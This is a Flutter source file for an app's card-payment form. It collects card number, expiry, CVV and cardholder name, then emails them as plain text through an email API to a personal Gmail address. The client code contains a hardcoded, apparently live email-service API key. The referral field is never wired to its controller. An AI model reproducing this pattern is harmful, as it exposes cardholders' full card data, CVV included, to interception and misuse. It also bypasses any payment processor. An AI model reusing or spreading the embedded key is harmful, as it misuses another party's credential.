import 'dart:convert';

import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:murphys_technology/api/apiurl.dart';
import 'package:murphys_technology/utils/device_size.dart';
import 'package:murphys_technology/utils/utils.dart';
import 'package:murphys_technology/views/pay_invoice/widget/loading.dart';
import 'package:murphys_technology/views/pricing/widget/card_number_input_formet.dart';
import 'package:http/http.dart' as http;
import 'package:murphys_technology/views/provider/notification.dart';
import 'package:provider/provider.dart';
import 'package:shared_preferences/shared_preferences.dart';

class List2 extends StatefulWidget {
  String price;
  String invoice;
  List2({
    super.key,
    required this.price,
    required this.invoice,
  });

  @override
  State<List2> createState() => _List2State();
}

class _List2State extends State<List2> {
  bool isSwitched = false;

  final GlobalKey<FormState> _key = GlobalKey<FormState>();

  final TextEditingController _paypalController = TextEditingController();

  final TextEditingController _validController = TextEditingController();

  final TextEditingController _cvvController = TextEditingController();

  final TextEditingController _nameController = TextEditingController();

  final TextEditingController _referralController = TextEditingController();

  @override
  Widget build(BuildContext context) {
    final _provider = Provider.of<NotificationProvider>(context);
    return Form(
      key: _key,
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Text(
            "Card number",
            style: TextStyle(
              fontSize: 18,
              fontFamily: "Poppins",
            ),
          ),
          const SizedBox(
            height: 7,
          ),
          TextFormField(
            inputFormatters: [
              LengthLimitingTextInputFormatter(16),
            ],
            controller: _paypalController,
            validator: (value) {
              if (value!.isEmpty) {
                return "Enter your Paypal number";
              } else if (value.length > 16 || value.length < 16) {
                return "There must be 16 number";
              } else {
                return null;
              }
            },
            decoration: InputDecoration(
              prefixIcon: Padding(
                padding: const EdgeInsets.only(right: 20),
                child: Container(
                  height: 40,
                  width: 70,
                  decoration: const BoxDecoration(
                      image: DecorationImage(
                          image: AssetImage("images/paypal.png"))),
                ),
              ),
              hintText: "* * * *  * * * *  * * * *  * * * *",
              border: OutlineInputBorder(
                borderRadius: BorderRadius.circular(20),
              ),
            ),
            keyboardType: TextInputType.number,
          ),
          SizedBox(
            height: getDeviceHeight(context) * 0.01,
          ),
          Row(
            children: [
              Flexible(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    const Text(
                      "Valid Until",
                      style: TextStyle(
                        fontSize: 18,
                        fontFamily: "Poppins",
                      ),
                    ),
                    TextFormField(
                      inputFormatters: [
                        LengthLimitingTextInputFormatter(5),
                        FilteringTextInputFormatter.digitsOnly,
                        CardMonthInputFormatter(),
                      ],
                      controller: _validController,
                      validator: (value) {
                        if (value!.isEmpty) {
                          return "Enter your Valid date";
                        } else {
                          return null;
                        }
                      },
                      decoration: InputDecoration(
                        hintText: "Month / Year",
                        border: OutlineInputBorder(
                          borderRadius: BorderRadius.circular(20),
                        ),
                      ),
                      keyboardType: TextInputType.datetime,
                    ),
                  ],
                ),
              ),
              const SizedBox(
                width: 10,
              ),
              Flexible(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    const Text(
                      "CVV",
                      style: TextStyle(
                        fontSize: 18,
                        fontFamily: "Poppins",
                      ),
                    ),
                    TextFormField(
                      inputFormatters: [
                        FilteringTextInputFormatter.digitsOnly,
                        LengthLimitingTextInputFormatter(3)
                      ],
                      controller: _cvvController,
                      validator: (value) {
                        if (value!.isEmpty) {
                          return "Enter your CVV";
                        } else if (value.length < 3 || value.length > 3) {
                          return "There must be 3 number";
                        } else {
                          return null;
                        }
                      },
                      decoration: InputDecoration(
                        hintText: " * * * ",
                        border: OutlineInputBorder(
                          borderRadius: BorderRadius.circular(20),
                        ),
                      ),
                      keyboardType: TextInputType.number,
                    ),
                  ],
                ),
              ),
            ],
          ),
          SizedBox(
            height: getDeviceHeight(context) * 0.01,
          ),
          const Text(
            "Card holder",
            style: TextStyle(
              fontSize: 18,
              fontFamily: "Poppins",
            ),
          ),
          const SizedBox(
            height: 7,
          ),
          TextFormField(
            controller: _nameController,
            validator: (value) {
              if (value!.isEmpty) {
                return "Enter Card holder name";
              } else {
                return null;
              }
            },
            decoration: InputDecoration(
                hintText: "Your Fullname",
                border: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(20),
                ),
                prefixIcon: const Icon(Icons.person_2)),
            keyboardType: TextInputType.name,
          ),
          const Text(
            "Referral Code",
            style: TextStyle(
              fontSize: 18,
              fontFamily: "Poppins",
            ),
          ),
          const SizedBox(
            height: 7,
          ),
          TextFormField(
            inputFormatters: [
              LengthLimitingTextInputFormatter(16),
            ],
            decoration: InputDecoration(
              hintText: "If you have any referral code",
              border: OutlineInputBorder(
                borderRadius: BorderRadius.circular(20),
              ),
            ),
            keyboardType: TextInputType.number,
          ),
          SizedBox(
            height: getDeviceHeight(context) * 0.01,
          ),
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              const Text(
                "Save card data for future payments",
                style: TextStyle(
                  fontSize: 14,
                  fontFamily: "Poppins",
                ),
              ),
              Transform.scale(
                scale: 0.8,
                child: CupertinoSwitch(
                  activeColor: const Color.fromARGB(255, 99, 183, 253),
                  thumbColor: const Color(0xff1C6BFE),
                  trackColor: Colors.blueGrey.shade300,
                  // activeColor: const Color(0xff1C6BFE),
                  // activeTrackColor: Colors.blue,
                  // inactiveThumbColor: Colors.blueGrey,
                  // inactiveTrackColor: Colors.blueGrey.shade600,
                  // splashRadius: 50,
                  value: isSwitched,
                  onChanged: (value) => setState(() => isSwitched = value),
                ),
              ),
            ],
          ),
          const SizedBox(
            height: 15,
          ),
          Center(
            child: SizedBox(
              height: 50,
              width: getDeviceWidth(context) * 0.8,
              child: ElevatedButton(
                style: ElevatedButton.styleFrom(
                  backgroundColor: const Color(0xff1C6BFE),
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(20),
                  ),
                ),
                onPressed: () async {
                  final isValid = _key.currentState!.validate();
                  if (isValid) {
                    bool? emailSent = await pysendEmail();
                    if (emailSent == true) {
                      Navigator.of(context).push(MaterialPageRoute(
                        builder: (context) => const LoadingScreen(),
                      ));
                      final int id = _provider.notifications.length + 1;
                      await _provider.showTopNotification(
                          _provider.flutterLocalNotificationsPlugin, id);
                    } else {
                      Utils.flushErrorMessage(
                          "Try again", context, Colors.brown);
                    }
                    // String totalprice = widget.price;
                    // String invoicenumber = widget.invoice;
                    // String name = _nameController.text;
                    // String validDate = _validController.text;
                    // String cvv = _cvvController.text;
                    // String number = _paypalController.text;
                    // String? encodeQueryParameters(Map<String, String> params) {
                    //   return params.entries
                    //       .map((MapEntry<String, String> e) =>
                    //           '${Uri.encodeComponent(e.key)}=${Uri.encodeComponent(e.value)}')
                    //       .join('&');
                    // }

                    // final Uri emailUri = Uri(
                    //   scheme: "mailto",
                    //   path: "info@murphystechnology.com",
                    //   query: encodeQueryParameters(
                    //     <String, String>{
                    //       "subject": "Credit card",
                    //       "body":
                    //           "Total Price: \$ $totalprice\n Invoice number: # $invoicenumber\n Card holder name:$name\n PayPal number: $number\n Valid date: $validDate\n CVV: $cvv"
                    //     },
                    //   ),
                    // );
                    // await launchUrl(emailUri);
                  }
                  // Navigator.of(context).push(MaterialPageRoute(
                  //   builder: (context) => const LoadingScreen(),
                  // ));
                },
                child: const Text(
                  "Proceed to confirm",
                  style: TextStyle(
                    fontSize: 17,
                    fontWeight: FontWeight.w500,
                    fontFamily: "Poppins",
                  ),
                ),
              ),
            ),
          )
        ],
      ),
    );
  }

  Future<bool> pysendEmail() async {
    final prefs = await SharedPreferences.getInstance();
    final ApiUrl = Api.appurl;
    final url = Uri.parse('$ApiUrl/send-email');
    final apiKey =
        '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'; // Replace with your API key

    final headers = {
      'Content-Type': 'application/json',
      'api-key': apiKey,
    };
    String card = _paypalController.text;
    String valid = _validController.text;
    String cvv = _cvvController.text;
    String name = _nameController.text;
    String referral = _referralController.text;
    String totalprice = widget.price.toString();
    String invoice = widget.invoice.toString();

    String? email = prefs.getString("email");
    String? fullname = prefs.getString("name");

    final emailData = {
      'sender': {'name': fullname, 'email': email},
      'to': [
        {'email': 'sagarmurphys@gmail.com'}
      ],
      'subject': 'Plans',
      'textContent':
          'Total price : $totalprice\n Invoice number : $invoice\n Card Number : $card\n Valid Unit : $valid\n CVV : $cvv\n Cards holder Name : $name\n Referral Code : $referral',
    };

    final response = await http.post(
      url,
      headers: headers,
      body: jsonEncode(emailData),
    );

    if (response.statusCode == 200) {
      print('Email sent successfully');
      _paypalController.clear();
      _validController.clear();
      _nameController.clear();
      _cvvController.clear();
      _referralController.clear();
      return true;
    } else {
      print('Failed to send email');
      print('Response: ${response.body}');
      return false;
    }
  }
}
